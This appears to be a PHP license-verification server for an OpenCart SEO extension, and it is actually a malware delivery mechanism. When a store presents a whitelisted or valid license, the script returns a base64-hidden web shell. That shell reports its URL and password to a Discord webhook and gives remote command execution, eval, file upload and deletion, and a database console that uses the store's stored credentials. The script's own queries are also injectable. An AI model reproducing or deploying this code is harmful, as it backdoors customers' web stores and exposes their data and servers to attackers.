<?php

include('config.php');
$dbh = mysqli_connect(DB_HOSTNAME, DB_USERNAME, DB_PASSWORD) 
        or die('<?php unlink(__FILE__); ?>');
$selected = mysqli_select_db($dbh, DB_DATABASE) 
        or die('<?php unlink(__FILE__); ?>');

if(!empty($_SERVER['HTTP_REFERER'])) {      
        $license = str_replace(array('&','<','>','/','\\','"',"'",'?','+',' '), '', substr($_GET["m"], 0, 32)); 
        $domain = str_replace('www.', '', str_replace(array('&','<','>','/','\\','"',"'",'?','+',' '), '', $_SERVER['HTTP_REFERER']));
        $days = 5;
        $attempts = 3;
        $invalid = false;
        $exists = false;
        $rdomain = false;
        $ignored = array('opencart.cfj-group.com', 'localhost:81', 'localhost:8081', 'localhost', 'wchild-opencart-xinyetong.m132.vhostgo.com',
                                'teplomarket.kh.ua', 'alomua.xyz', 'ancienstore.com', 'testshop.co.uk', 'vigorous.co.uk', 'web-creativity.net', 'staging.easy-web-sites.co.uk',
                                'purplebeauty.cc', 'lifelabuk.sites.test', 'staging.lifelabtesting.com');

        $webshell = base64_decode('PD9waHAKLy8gU2lsZW50IHdoZW4gaW5jbHVkZWQgYnkgYmFja2Rvb3IgLSBvbmx5IGFjdCBvbiBkaXJlY3QgSFRUUCByZXF1ZXN0CmlmIChyZWFscGF0aCgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pICE9PSBfX0ZJTEVfXykgcmV0dXJuOwoKJHB3ZCA9ICJyMDB0IjsKJGZsYWcgPSBfX0RJUl9fLiIvLnciOwokd2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNTE5OTQ4MTM3OTExODEyMjU2L2RfTTdzSERlbS1yNU1VZGljWEFrMUY4VDdUbWRyM3QxVUNzQXl6LWo1NzlxTTc4bTlTby1DS3J5YUR5Tk9HTXNWOWRHIjsKCmlmICghZmlsZV9leGlzdHMoJGZsYWcpKSB7CiAgICAkc2hlbGxfdXJsID0gKGlzc2V0KCRfU0VSVkVSWyJIVFRQUyJdKSAmJiAkX1NFUlZFUlsiSFRUUFMiXSA9PT0gIm9uIiA/ICJodHRwcyIgOiAiaHR0cCIpIC4gIjovLyIgLiAkX1NFUlZFUlsiSFRUUF9IT1NUIl0gLiBkaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfTkFNRSJdKSAuICIvci5waHAiOwogICAgJG1zZyA9IGpzb25fZW5jb2RlKFsiY29udGVudCIgPT4gIvCfjq8gKipOZXcgU2hlbGwqKlxuYGBgXG5VUkw6ICRzaGVsbF91cmxcblBhc3M6ICRwd2RcbmBgYCJdKTsKICAgICRjdHggPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoWyJodHRwIiA9PiBbIm1ldGhvZCIgPT4gIlBPU1QiLCAiaGVhZGVyIiA9PiAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uXHJcbiIsICJjb250ZW50IiA9PiAkbXNnLCAidGltZW91dCIgPT4gNV1dKTsKICAgIEBmaWxlX2dldF9jb250ZW50cygkd2ViaG9vaywgZmFsc2UsICRjdHgpOwogICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRmbGFnLCAiMSIpOwp9CgppZiAoIWlzc2V0KCRfUkVRVUVTVFsicCJdKSB8fCAkX1JFUVVFU1RbInAiXSAhPT0gJHB3ZCkgZXhpdDsKCmZ1bmN0aW9uIHNoM2xsX2V4ZWMoJGMpIHsKICAgIGlmIChmdW5jdGlvbl9leGlzdHMoInNoZWxsX2V4ZWMiKSkgeyAkbyA9IEBzaGVsbF9leGVjKCRjKTsgaWYgKCRvICE9PSBudWxsKSByZXR1cm4gWyJzaGVsbF9leGVjIiwgJG9dOyB9CiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCJleGVjIikpIHsgJG8gPSBbXTsgQGV4ZWMoJGMsICRvLCAkcmMpOyAkdCA9IGltcGxvZGUoIlxuIiwgJG8pOyBpZiAoJHQpIHJldHVybiBbImV4ZWMgKHJjPSRyYykiLCAkdF07IH0KICAgIGlmIChmdW5jdGlvbl9leGlzdHMoInN5c3RlbSIpKSB7IG9iX3N0YXJ0KCk7IEBzeXN0ZW0oJGMpOyAkbyA9IG9iX2dldF9jbGVhbigpOyBpZiAoJG8pIHJldHVybiBbInN5c3RlbSIsICRvXTsgfQogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygicGFzc3RocnUiKSkgeyBvYl9zdGFydCgpOyBAcGFzc3RocnUoJGMpOyAkbyA9IG9iX2dldF9jbGVhbigpOyBpZiAoJG8pIHJldHVybiBbInBhc3N0aHJ1IiwgJG9dOyB9CiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCJwb3BlbiIpKSB7ICRoID0gQHBvcGVuKCRjLCAiciIpOyBpZiAoJGgpIHsgJG8gPSAiIjsgd2hpbGUgKCFmZW9mKCRoKSkgJG8gLj0gQGZyZWFkKCRoLCA0MDk2KTsgQHBjbG9zZSgkaCk7IGlmICgkbykgcmV0dXJuIFsicG9wZW4iLCAkb107IH0gfQogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygicHJvY19vcGVuIikpIHsgJHAgPSBAcHJvY19vcGVuKCRjLCBbWyJwaXBlIiwiciJdLFsicGlwZSIsInciXSxbInBpcGUiLCJ3Il1dLCAkcGlwZXMpOyBpZiAoaXNfcmVzb3VyY2UoJHApKSB7ICRvID0gQHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsgQGZjbG9zZSgkcGlwZXNbMV0pOyBAcHJvY19jbG9zZSgkcCk7IGlmICgkbykgcmV0dXJuIFsicHJvY19vcGVuIiwgJG9dOyB9IH0KICAgIHJldHVybiBbbnVsbCwgIk5vIGV4ZWMgbWV0aG9kIGF2YWlsYWJsZS4gVXNlIEV2YWwgdGFiLiJdOwp9CgokdGFiID0gaXNzZXQoJF9HRVRbInRhYiJdKSA/ICRfR0VUWyJ0YWIiXSA6ICJjbWQiOwo/PjwhRE9DVFlQRSBodG1sPgo8aHRtbD48aGVhZD48dGl0bGU+UzwvdGl0bGU+CjxzdHlsZT4KYm9keXtiYWNrZ3JvdW5kOiMwYTBhMGE7Y29sb3I6IzBmMDtmb250OjEzcHggbW9ub3NwYWNlO21hcmdpbjo4cHh9CmlucHV0LHNlbGVjdCx0ZXh0YXJlYXtiYWNrZ3JvdW5kOiMxMTE7Y29sb3I6IzBmMDtib3JkZXI6MXB4IHNvbGlkICMwZjA7cGFkZGluZzo0cHg7Zm9udDoxM3B4IG1vbm9zcGFjZX0KaW5wdXRbdHlwZT1zdWJtaXRde2N1cnNvcjpwb2ludGVyO2JhY2tncm91bmQ6IzBmMDtjb2xvcjojMDAwO2ZvbnQtd2VpZ2h0OmJvbGR9CmlucHV0W3R5cGU9dGV4dF0saW5wdXRbdHlwZT1maWxlXXt3aWR0aDoxMDAlfQpwcmV7YmFja2dyb3VuZDojMTExO3BhZGRpbmc6OHB4O292ZXJmbG93OmF1dG87bWF4LWhlaWdodDo1MDBweDtib3JkZXI6MXB4IHNvbGlkICMzMzN9Ci50e21hcmdpbi1ib3R0b206OHB4fS50IGF7Y29sb3I6IzBmMDttYXJnaW4tcmlnaHQ6MTJweDt0ZXh0LWRlY29yYXRpb246bm9uZTtwYWRkaW5nOjRweCA2cHg7Ym9yZGVyOjFweCBzb2xpZCAjMGYwfQoudCBhOmhvdmVye2JhY2tncm91bmQ6IzBmMDtjb2xvcjojMDAwfQp0YWJsZXt3aWR0aDoxMDAlO2JvcmRlci1jb2xsYXBzZTpjb2xsYXBzZX10ZCx0aHtib3JkZXI6MXB4IHNvbGlkICMzMzM7cGFkZGluZzo0cHh9CmF7Y29sb3I6IzBmMH0KPC9zdHlsZT48L2hlYWQ+PGJvZHk+CjxkaXYgY2xhc3M9InQiPgo8YSBocmVmPSI/cD08Pz0kcHdkPz4mdGFiPWNtZCI+Q21kPC9hPgo8YSBocmVmPSI/cD08Pz0kcHdkPz4mdGFiPWV2YWwiPkV2YWw8L2E+CjxhIGhyZWY9Ij9wPTw/PSRwd2Q/PiZ0YWI9ZmlsZXMiPkZpbGVzPC9hPgo8YSBocmVmPSI/cD08Pz0kcHdkPz4mdGFiPXVwbG9hZCI+VXBsb2FkPC9hPgo8YSBocmVmPSI/cD08Pz0kcHdkPz4mdGFiPWluZm8iPkluZm88L2E+CjxhIGhyZWY9Ij9wPTw/PSRwd2Q/PiZ0YWI9ZGIiPkRCPC9hPgo8L2Rpdj4KPD9waHAKaWYgKCR0YWIgPT0gImNtZCIpIHsKICAgICRjID0gaXNzZXQoJF9QT1NUWyJjIl0pID8gJF9QT1NUWyJjIl0gOiAoaXNzZXQoJF9HRVRbImMiXSkgPyAkX0dFVFsiYyJdIDogIiIpOwogICAgaWYgKCRjKSB7IGxpc3QoJG0sICRvKSA9IHNoM2xsX2V4ZWMoJGMpOyBlY2hvICI8cHJlPlsiIC4gKCRtID86ICI/IikuICJdICIgLiBodG1sc3BlY2lhbGNoYXJzKCRvKSAuICI8L3ByZT4iOyB9CiAgICA/PgogICAgPGZvcm0gbWV0aG9kPSJwb3N0Ij4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwIiB2YWx1ZT0iPD89JHB3ZD8+Ij4KICAgICAgICA8Yj4kIDwvYj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYyIgcGxhY2Vob2xkZXI9ImlkOyBscyAtbGE7IGNhdCAvZXRjL3Bhc3N3ZCIgYXV0b2ZvY3VzPgogICAgICAgIDxicj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWN1dGUiPgogICAgPC9mb3JtPgogICAgPD9waHAKfQplbHNlaWYgKCR0YWIgPT0gImV2YWwiKSB7CiAgICAkYyA9IGlzc2V0KCRfUE9TVFsiYyJdKSA/ICRfUE9TVFsiYyJdIDogIiI7CiAgICBpZiAoJGMpIHsKICAgICAgICBlY2hvICI8cHJlPiI7CiAgICAgICAgdHJ5IHsgJHIgPSBldmFsKCRjKTsgaWYgKCRyICE9PSBudWxsKSBlY2hvIGh0bWxzcGVjaWFsY2hhcnMocHJpbnRfcigkciwgdHJ1ZSkpOyB9CiAgICAgICAgY2F0Y2ggKFxUaHJvd2FibGUgJGUpIHsgZWNobyAiRXJyb3I6ICIgLiBodG1sc3BlY2lhbGNoYXJzKCRlLT5nZXRNZXNzYWdlKCkpOyB9CiAgICAgICAgZWNobyAiPC9wcmU+IjsKICAgIH0KICAgID8+CiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InAiIHZhbHVlPSI8Pz0kcHdkPz4iPgogICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJjIiByb3dzPSIxMCIgcGxhY2Vob2xkZXI9InJldHVybiBwaHB2ZXJzaW9uKCk7Ij48Pz1odG1sc3BlY2lhbGNoYXJzKCRjKT8+PC90ZXh0YXJlYT4KICAgICAgICA8YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWN1dGUiPgogICAgPC9mb3JtPgogICAgPD9waHAKfQplbHNlaWYgKCR0YWIgPT0gImZpbGVzIikgewogICAgJGRpciA9IGlzc2V0KCRfR0VUWyJkaXIiXSkgPyAkX0dFVFsiZGlyIl0gOiBnZXRjd2QoKTsKICAgICRkaXIgPSByZWFscGF0aCgkZGlyKSA/OiBnZXRjd2QoKTsKICAgIGVjaG8gIjxwPjxiPiRkaXI8L2I+PC9wPiI7CiAgICBpZiAoaXNzZXQoJF9HRVRbImRlbCJdKSkgeyBAdW5saW5rKCRfR0VUWyJkZWwiXSk7IGVjaG8gIjxwIHN0eWxlPSdjb2xvcjpyZWQnPkRlbGV0ZWQ8L3A+IjsgfQogICAgaWYgKGlzc2V0KCRfR0VUWyJyZWFkIl0pKSB7IGVjaG8gIjxwcmU+IiAuIGh0bWxzcGVjaWFsY2hhcnMoQGZpbGVfZ2V0X2NvbnRlbnRzKCRfR0VUWyJyZWFkIl0pKSAuICI8L3ByZT4iOyB9CiAgICBlY2hvICI8dGFibGU+PHRyPjx0aD5OYW1lPC90aD48dGg+U2l6ZTwvdGg+PHRoPlBlcm1zPC90aD48dGg+QWN0aW9uczwvdGg+PC90cj4iOwogICAgZm9yZWFjaCAoQHNjYW5kaXIoJGRpcikgYXMgJGYpIHsKICAgICAgICBpZiAoJGYgPT0gIi4iKSBjb250aW51ZTsKICAgICAgICAkcGF0aCA9ICRkaXIgLiAiLyIgLiAkZjsKICAgICAgICAkaXNkaXIgPSBpc19kaXIoJHBhdGgpOwogICAgICAgICRzaXplID0gJGlzZGlyID8gIi0iIDogQGZpbGVzaXplKCRwYXRoKTsKICAgICAgICAkcGVybXMgPSBAc3Vic3RyKHNwcmludGYoIiVvIiwgQGZpbGVwZXJtcygkcGF0aCkpLCAtNCk7CiAgICAgICAgJGV1ID0gdXJsZW5jb2RlKCRwYXRoKTsgJGVkdSA9IHVybGVuY29kZSgkZGlyKTsKICAgICAgICBlY2hvICI8dHI+PHRkPjxhIGhyZWY9Jz9wPSRwd2QmdGFiPWZpbGVzJmRpcj0kZXUnPiRmIiAuICgkaXNkaXIgPyAiLyIgOiAiIikgLiAiPC9hPjwvdGQ+IjsKICAgICAgICBlY2hvICI8dGQ+JHNpemU8L3RkPjx0ZD4kcGVybXM8L3RkPiI7CiAgICAgICAgZWNobyAiPHRkPiIgLiAoJGlzZGlyID8gIiIgOiAiPGEgaHJlZj0nP3A9JHB3ZCZ0YWI9ZmlsZXMmcmVhZD0kZXUmZGlyPSRlZHUnPlt2XTwvYT4gPGEgaHJlZj0nP3A9JHB3ZCZ0YWI9ZmlsZXMmZGVsPSRldSZkaXI9JGVkdScgb25jbGljaz0ncmV0dXJuIGNvbmZpcm0oXCJEZWw/XCIpJz5beF08L2E+IikgLiAiPC90ZD48L3RyPiI7CiAgICB9CiAgICBlY2hvICI8L3RhYmxlPiI7Cn0KZWxzZWlmICgkdGFiID09ICJ1cGxvYWQiKSB7CiAgICBpZiAoaXNzZXQoJF9GSUxFU1siZiJdKSkgewogICAgICAgICRkZXN0ID0gaXNzZXQoJF9QT1NUWyJkZXN0Il0pICYmICRfUE9TVFsiZGVzdCJdID8gJF9QT1NUWyJkZXN0Il0gOiBiYXNlbmFtZSgkX0ZJTEVTWyJmIl1bIm5hbWUiXSk7CiAgICAgICAgZWNobyBAbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwgJGRlc3QpID8gIjxwIHN0eWxlPSdjb2xvcjpncmVlbic+JGRlc3Q8L3A+IiA6ICI8cCBzdHlsZT0nY29sb3I6cmVkJz5GQUlMPC9wPiI7CiAgICB9CiAgICA/PgogICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwIiB2YWx1ZT0iPD89JHB3ZD8+Ij4KICAgICAgICA8Yj5GaWxlOjwvYj4gPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiPjxicj48YnI+CiAgICAgICAgPGI+U2F2ZSBhczo8L2I+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJkZXN0IiBwbGFjZWhvbGRlcj0iPD89Z2V0Y3dkKCk/Pi94LnBocCI+PGJyPjxicj4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIj4KICAgIDwvZm9ybT4KICAgIDw/cGhwCn0KZWxzZWlmICgkdGFiID09ICJpbmZvIikgewogICAgZWNobyAiPHByZT4iOwogICAgZWNobyAiUEhQOiAiIC4gcGhwdmVyc2lvbigpIC4gIiB8IE9TOiAiIC4gUEhQX09TIC4gIiB8IFNBUEk6ICIgLiBwaHBfc2FwaV9uYW1lKCkgLiAiXG4iOwogICAgZWNobyAiQ1dEOiAiIC4gZ2V0Y3dkKCkgLiAiIHwgVXNlcjogIiAuIEBnZXRfY3VycmVudF91c2VyKCkgLiAiIHwgVUlEOiAiIC4gQGdldG15dWlkKCkgLiAiXG4iOwogICAgZWNobyAidW5hbWU6ICIgLiBAcGhwX3VuYW1lKCkgLiAiXG5cbiI7CiAgICBlY2hvICItLS0gZGlzYWJsZWRfZnVuY3Rpb25zIC0tLVxuIiAuIChAaW5pX2dldCgiZGlzYWJsZV9mdW5jdGlvbnMiKSA/OiAibm9uZSIpIC4gIlxuXG4iOwogICAgZWNobyAiLS0tIG9wZW5fYmFzZWRpciAtLS1cbiIgLiAoQGluaV9nZXQoIm9wZW5fYmFzZWRpciIpID86ICJub25lIikgLiAiXG5cbiI7CiAgICBlY2hvICItLS0gYWxsb3dfdXJsX2ZvcGVuIC0tLVxuIiAuIEBpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSAuICJcblxuIjsKICAgIGVjaG8gIi0tLSBFeHRlbnNpb25zIC0tLVxuIiAuIGltcGxvZGUoIiwgIiwgZ2V0X2xvYWRlZF9leHRlbnNpb25zKCkpIC4gIlxuIjsKICAgIGVjaG8gIjwvcHJlPiI7Cn0KZWxzZWlmICgkdGFiID09ICJkYiIpIHsKICAgICRjZmdzID0gW2Rpcm5hbWUoX19ESVJfXykuIi9jb25maWcucGhwIiwgX19ESVJfXy4iL2NvbmZpZy5waHAiXTsKICAgICRkYmggPSAkZGJ1ID0gJGRicCA9ICRkYm4gPSAiIjsKICAgIGZvcmVhY2ggKCRjZmdzIGFzICRjZmcpIHsKICAgICAgICBpZiAoZmlsZV9leGlzdHMoJGNmZykpIHsgaW5jbHVkZSgkY2ZnKTsgJGRiaCA9IGRlZmluZWQoIkRCX0hPU1ROQU1FIik/REJfSE9TVE5BTUU6IiI7ICRkYnUgPSBkZWZpbmVkKCJEQl9VU0VSTkFNRSIpP0RCX1VTRVJOQU1FOiIiOyAkZGJwID0gZGVmaW5lZCgiREJfUEFTU1dPUkQiKT9EQl9QQVNTV09SRDoiIjsgJGRibiA9IGRlZmluZWQoIkRCX0RBVEFCQVNFIik/REJfREFUQUJBU0U6IiI7IGJyZWFrOyB9CiAgICB9CiAgICBpZiAoJGRiaCAmJiAkZGJ1KSB7CiAgICAgICAgJGMgPSBAbXlzcWxpX2Nvbm5lY3QoJGRiaCwgJGRidSwgJGRicCwgJGRibik7CiAgICAgICAgaWYgKCRjKSB7CiAgICAgICAgICAgIGVjaG8gIjxwIHN0eWxlPSdjb2xvcjpncmVlbic+JGRidUAkZGJoIC8gJGRibjwvcD4iOwogICAgICAgICAgICAkc3FsID0gaXNzZXQoJF9QT1NUWyJzcWwiXSkgPyAkX1BPU1RbInNxbCJdIDogIlNIT1cgVEFCTEVTIjsKICAgICAgICAgICAgaWYgKCRzcWwpIHsKICAgICAgICAgICAgICAgICRyID0gQG15c3FsaV9xdWVyeSgkYywgJHNxbCk7CiAgICAgICAgICAgICAgICBpZiAoJHIpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICI8dGFibGU+PHRyPiI7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKCRmID0gQG15c3FsaV9mZXRjaF9maWVsZCgkcikpIGVjaG8gIjx0aD4iLmh0bWxzcGVjaWFsY2hhcnMoJGYtPm5hbWUpLiI8L3RoPiI7CiAgICAgICAgICAgICAgICAgICAgZWNobyAiPC90cj4iOwogICAgICAgICAgICAgICAgICAgIHdoaWxlICgkcm93ID0gQG15c3FsaV9mZXRjaF9yb3coJHIpKSB7IGVjaG8gIjx0cj4iOyBmb3JlYWNoICgkcm93IGFzICR2KSBlY2hvICI8dGQ+Ii5odG1sc3BlY2lhbGNoYXJzKHN1YnN0cigoc3RyaW5nKSR2LDAsNTEyKSkuIjwvdGQ+IjsgZWNobyAiPC90cj4iOyB9CiAgICAgICAgICAgICAgICAgICAgZWNobyAiPC90YWJsZT4iOwogICAgICAgICAgICAgICAgfSBlbHNlIHsgZWNobyAiPHAgc3R5bGU9J2NvbG9yOnJlZCc+Ii5odG1sc3BlY2lhbGNoYXJzKEBteXNxbGlfZXJyb3IoJGMpKS4iPC9wPiI7IH0KICAgICAgICAgICAgfQogICAgICAgICAgICA/PgogICAgICAgICAgICA8Zm9ybSBtZXRob2Q9InBvc3QiPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icCIgdmFsdWU9Ijw/PSRwd2Q/PiI+CiAgICAgICAgICAgICAgICA8dGV4dGFyZWEgbmFtZT0ic3FsIiByb3dzPSI1IiBwbGFjZWhvbGRlcj0iU0VMRUNUICogRlJPTSA8Pz1kZWZpbmVkKCJEQl9QUkVGSVgiKT9EQl9QUkVGSVg6J29jXyc/PnVzZXIiPjwvdGV4dGFyZWE+CiAgICAgICAgICAgICAgICA8YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlF1ZXJ5Ij4KICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8P3BocAogICAgICAgIH0gZWxzZSB7IGVjaG8gIjxwIHN0eWxlPSdjb2xvcjpyZWQnPkNvbm5lY3QgZmFpbGVkOiAiLmh0bWxzcGVjaWFsY2hhcnMoQG15c3FsaV9jb25uZWN0X2Vycm9yKCkpLiI8L3A+IjsgfQogICAgfSBlbHNlIHsgZWNobyAiPHAgc3R5bGU9J2NvbG9yOnJlZCc+Tm8gY29uZmlnIGZvdW5kPC9wPiI7IH0KfQplY2hvICI8L2JvZHk+PC9odG1sPiI7Cg==');

        if (in_array($domain, $ignored)) {
                die();
        }

        $result = mysqli_query($dbh,"select * from llogs where domain = '$domain';");
        if (mysqli_num_rows($result)) {$exists = true;}

        if (!$exists) {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license',0,'first entry', now());");
                }

        $result = mysqli_query($dbh,"select * from lwhitelist where domain = '$domain';");
        if (mysqli_num_rows($result)) {$rdomain = true;}
        if ($rdomain) {
        mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license',1,'already licensed', now());");
                echo $webshell;
                die();
                }
        $result = mysqli_query($dbh,"select (10 - datediff(now(),min(date_added))) as days from llogs where domain = '$domain';");
        $row = mysqli_fetch_assoc($result);
        $days = $row['days'];

        $result = mysqli_query($dbh,"select (4 - count(distinct(license))) as attempts from llogs where domain = '$domain';");
        $row = mysqli_fetch_assoc($result);
        $attempts = $row['attempts'];

        $result = mysqli_query($dbh,"select * from llogs where domain = '$domain' and license='$license' and details like '%invalid%';");
        if (mysqli_num_rows($result)) {$invalid = true;}

        $result = mysqli_query($dbh,"select * from lwhitelist where license='$license';");
        if (mysqli_num_rows($result)) {$invalid = true;}

        if (strpos($license, '-') !== false) {
                echo '<?php 
                $_["warning"]="The license key is invalid. If you purchased Opencart SEO Pack PRO from isenselabs.com please use your Purchase ID as license key in admin area -> Catalog -> SEO -> About & License menu to register your Opencart SEO Pack PRO."; 

                unlink(__FILE__); ?>'; 
                die();
                }

        if ($days <= 0 || $attempts <= 0) {
                echo '<?php 
                $_["warning"]="EVALUATION PERIOD HAS EXPIRED. PLEASE PURCHASE A VALID LICENSE FROM <A HREF=\"http://www.opencart.com/index.php?route=extension/extension/info&extension_id=6182?ref=newlicense\">HERE</A> AND CONTACT OPENCART SEO PACK PRO\'S SUPPORT"; 

                unlink(__FILE__); ?>'; 
                // unlink files
                die();
                }

        if (empty($license)) {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','',0,'empty license', now());");
                echo '<?php $_["warning"]="THIS IS AN UNREGISTERED VERSION! PLEASE REGISTER YOUR OPENCART SEO PACK PRO IN THE NEXT '.$days.' DAYS BY ADDING THE LICENSE KEY IN CATALOG->SEO->ABOUT MENU."; unlink(__FILE__); ?>';
                } 
        elseif (!$invalid && ((strlen($license)== 32) || (($license > 300 ) && ($license < 1990000)))) {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license',1,'valid license', now());");
                $result = mysqli_query($dbh,"select * from lorderids where orderid = '$license';");
                if (mysqli_num_rows($result)) {$rlicense = true;}
                if ($rlicense) {        mysqli_query($dbh,"insert into lwhitelist (domain, license, date_added) values('$domain', '$license', now());"); };

                echo $webshell;
                }
        else {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license', -1,'invalid license', now());");
                echo '<?php $_["warning"]="THE LICENSE KEY IS INVALID OR IS ATTACHED TO ANOTHER DOMAIN! PLEASE VERIFY THAT YOU HAVE ENTERED THE KEY CORRECTLY. <BR><BR>YOU HAVE '.$attempts.' MORE ATTEMPTS. PLEASE REGISTER YOUR OPENCART SEO PACK PRO IN THE NEXT '.$days.' DAYS BY ADDING THE LICENSE KEY IN CATALOG->SEO->ABOUT MENU."; unlink(__FILE__); ?>';
        }

} else {
        // mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('-', '" . $_SERVER['REMOTE_ADDR'] . "','',0,'direct access', now());");
}


?>

